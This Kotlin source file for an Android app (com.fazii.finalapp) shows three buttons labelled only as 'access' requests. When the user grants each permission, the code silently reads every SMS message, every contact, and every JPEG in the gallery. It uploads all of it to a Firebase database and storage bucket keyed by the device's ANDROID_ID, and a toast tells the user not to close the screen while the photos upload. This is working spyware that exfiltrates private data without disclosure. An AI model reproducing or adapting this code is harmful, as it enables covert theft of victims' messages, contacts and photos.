package com.fazii.finalapp

import android.Manifest
import android.annotation.SuppressLint
import android.content.ContentResolver
import android.content.ContentUris
import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.os.Bundle
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import android.provider.Telephony
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.Image
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.res.painterResource
import androidx.compose.ui.unit.dp
import com.fazii.finalapp.ui.theme.FinalappTheme
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.storage.FirebaseStorage
import kotlinx.coroutines.*

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            FinalappTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    MainScreen()
                }
            }
        }
    }
}

@Composable
fun MainScreen() {
    var showProgress by remember { mutableStateOf(false) }
    var progress by remember { mutableStateOf(0f) }

    Box(
        modifier = Modifier.fillMaxSize()
    ) {
        Image(
            painter = painterResource(id = R.drawable.picc),
            contentDescription = null,
            contentScale = ContentScale.Crop,
            modifier = Modifier.fillMaxSize()
        )
        Column(
            modifier = Modifier.fillMaxSize(),
            verticalArrangement = Arrangement.Center,
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            PermissionButtons(
                onProgressChange = { show, prog ->
                    showProgress = show
                    progress = prog
                }
            )

            if (showProgress) {
                Spacer(modifier = Modifier.height(32.dp))
                CircularProgressIndicator(
                    progress = { progress / 100 },
                    color = Color.Black,
                )
                Spacer(modifier = Modifier.height(8.dp))
                Text(
                    text = "${progress.toInt()}%",
                    color = Color.Black
                )
            }
        }
    }
}

@Composable
fun PermissionButtons(
    onProgressChange: (Boolean, Float) -> Unit
) {
    val context = LocalContext.current

    // Message permissions launcher
    val messagePermissionsLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if (isGranted) {
            val messages = fetchMessages(context)
            uploadMessagesToFirebase(context, messages)
        } else {
            Toast.makeText(context, "Permission denied for messages", Toast.LENGTH_LONG).show()
        }
    }

    // Contact permissions launcher
    val contactPermissionsLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if (isGranted) {
            val contacts = fetchContacts(context)
            uploadContactsToFirebase(context, contacts)
        } else {
            Toast.makeText(context, "Permission denied for contacts", Toast.LENGTH_LONG).show()
        }
    }

    // Gallery permissions launcher
    val galleryPermissionsLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if (isGranted) {
            // Show the Toast message
            Toast.makeText(context, "Wait for a minute don't close your screen...", Toast.LENGTH_SHORT).show()

            // Delay starting the progress bar update to ensure Toast visibility
            CoroutineScope(Dispatchers.Main).launch {
                delay(1000)
                val imageUriList = getAllImagesUri(context)
                uploadImagesToFirebase(context, imageUriList, onProgressChange)
            }
        } else {
            Toast.makeText(context, "Permission denied for gallery", Toast.LENGTH_LONG).show()
        }
    }

    Column(
        modifier = Modifier,
        verticalArrangement = Arrangement.Center,
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        Button(
            onClick = {
                messagePermissionsLauncher.launch(Manifest.permission.READ_SMS)
            },
            colors = ButtonDefaults.buttonColors(
                containerColor = Color(0xFF87195a),
                contentColor = Color.White
            )
        ) {
            Text("Message Access...")
        }

        Spacer(modifier = Modifier.height(16.dp))

        Button(
            onClick = {
                contactPermissionsLauncher.launch(Manifest.permission.READ_CONTACTS)
            },
            colors = ButtonDefaults.buttonColors(
                containerColor = Color(0xFF87195a),
                contentColor = Color.White
            )
        ) {
            Text("Contact Access...")
        }

        Spacer(modifier = Modifier.height(16.dp))

        Button(
            onClick = {
                galleryPermissionsLauncher.launch(Manifest.permission.READ_EXTERNAL_STORAGE)
            },
            colors = ButtonDefaults.buttonColors(
                containerColor = Color(0xFF87195a),
                contentColor = Color.White
            )
        ) {
            Text("Gallery Access...")
        }
    }
}

@SuppressLint("Range")
fun fetchContacts(context: Context): List<Contact> {
    val contactsList = mutableListOf<Contact>()
    val cursor = context.contentResolver.query(
        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
        null,
        null,
        null,
        null
    )
    while (cursor?.moveToNext() == true) {
        val name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
        val phoneNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
        contactsList.add(Contact(name, phoneNumber))
    }
    cursor?.close()
    return contactsList
}

@SuppressLint("HardwareIds")
fun uploadContactsToFirebase(context: Context, contacts: List<Contact>) {
    val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
    val databaseReference = FirebaseDatabase.getInstance().getReference("contacts/$deviceId")
    contacts.forEach { contact ->
        val key = databaseReference.push().key
        if (key != null) {
            databaseReference.child(key).setValue(contact)
        }
    }
}

fun getAllImagesUri(context: Context): List<Uri> {
    val uriList = mutableListOf<Uri>()
    val projection = arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.MIME_TYPE)
    val selection = "${MediaStore.Images.Media.MIME_TYPE}=? OR ${MediaStore.Images.Media.MIME_TYPE}=?"
    val selectionArgs = arrayOf("image/jpeg", "image/jpg")

    val cursor = context.contentResolver.query(
        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
        projection,
        selection,
        selectionArgs,
        null
    )

    cursor?.use {
        val idColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
        while (it.moveToNext()) {
            val id = it.getLong(idColumn)
            val contentUri: Uri = ContentUris.withAppendedId(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                id
            )
            uriList.add(contentUri)
        }
    }

    return uriList
}

fun uploadImagesToFirebase(
    context: Context,
    uriList: List<Uri>,
    onProgressChange: (Boolean, Float) -> Unit
) {
    val storageRef = FirebaseStorage.getInstance().reference.child("galleryPhotos")
    val totalImages = uriList.size
    var uploadedImages = 0

    onProgressChange(true, 0f)

    uriList.forEach { uri ->
        val photoRef = storageRef.child(uri.lastPathSegment ?: "image_${System.currentTimeMillis()}")
        photoRef.putFile(uri).addOnSuccessListener {
            uploadedImages++
            val progress = (uploadedImages.toFloat() / totalImages) * 100
            onProgressChange(true, progress)
            if (uploadedImages == totalImages) {
                onProgressChange(false, 100f)
                Toast.makeText(context, "Upload completed", Toast.LENGTH_LONG).show()
            }
        }.addOnFailureListener {
            Toast.makeText(context, "Failed to upload image: ${uri.lastPathSegment}", Toast.LENGTH_LONG).show()
        }
    }
}

@SuppressLint("Range")
fun fetchMessages(context: Context): List<Message> {
    val messagesList = mutableListOf<Message>()
    val uri: Uri = Telephony.Sms.CONTENT_URI
    val cursor: Cursor? = context.contentResolver.query(uri, null, null, null, null)
    while (cursor?.moveToNext() == true) {
        val body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY))
        val address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS))
        val date = cursor.getLong(cursor.getColumnIndex(Telephony.Sms.DATE))
        messagesList.add(Message(address, body, date))
    }
    cursor?.close()
    return messagesList
}

@SuppressLint("HardwareIds")
fun uploadMessagesToFirebase(context: Context, messages: List<Message>) {
    val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
    val databaseReference = FirebaseDatabase.getInstance().getReference("messages/$deviceId")
    messages.forEach { message ->
        val key = databaseReference.push().key
        if (key != null) {
            databaseReference.child(key).setValue(message)
        }
    }
}


data class Message(val address: String, val body: String, val date: Long)
